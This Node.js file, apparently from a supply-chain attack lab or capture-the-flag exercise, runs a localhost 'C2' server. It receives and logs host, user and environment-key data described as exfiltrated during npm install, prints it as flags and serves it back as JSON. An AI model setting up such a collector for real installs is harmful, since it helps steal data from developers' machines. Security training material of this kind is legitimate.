const http = require("http");

const captured = [];

const server = http.createServer((req, res) => {
  if (req.method === "POST" && req.url === "/exfil") {
    let body = "";
    req.on("data", (chunk) => (body += chunk));
    req.on("end", () => {
      try {
        const parsed = JSON.parse(body);
        captured.push(parsed);
        console.log("\n\x1b[31m========================================\x1b[0m");
        console.log("\x1b[31m  DATA EXFILTRATED DURING npm install\x1b[0m");
        console.log("\x1b[31m========================================\x1b[0m");
        console.log(`  Hostname:     ${parsed.hostname}`);
        console.log(`  Username:     ${parsed.username}`);
        console.log(`  Platform:     ${parsed.platform}`);
        console.log(`  Working Dir:  ${parsed.cwd}`);
        console.log(`  Node Version: ${parsed.nodeVersion}`);
        console.log(`  Env Keys:     ${(parsed.envKeys || []).join(", ") || "none"}`);
        console.log(`  Timestamp:    ${parsed.timestamp}`);
        if (parsed.channel) console.log(`  Channel:      ${parsed.channel}`);
        console.log("\x1b[31m========================================\x1b[0m\n");
        console.log(`\x1b[32m[FLAG] hostname=${parsed.hostname}\x1b[0m`);
        console.log(`\x1b[32m[FLAG] username=${parsed.username}\x1b[0m`);
      } catch (e) {
        console.log("[!] Failed to parse exfil data");
      }
      res.writeHead(200);
      res.end("OK");
    });
  } else if (req.method === "GET" && req.url === "/captured") {
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify(captured, null, 2));
  } else {
    res.writeHead(404);
    res.end("Not Found");
  }
});

server.listen(3000, () => {
  console.log("[*] C2 Monitoring Server running on http://127.0.0.1:3000");
  console.log("[*] Waiting for exfiltrated data...\n");
});
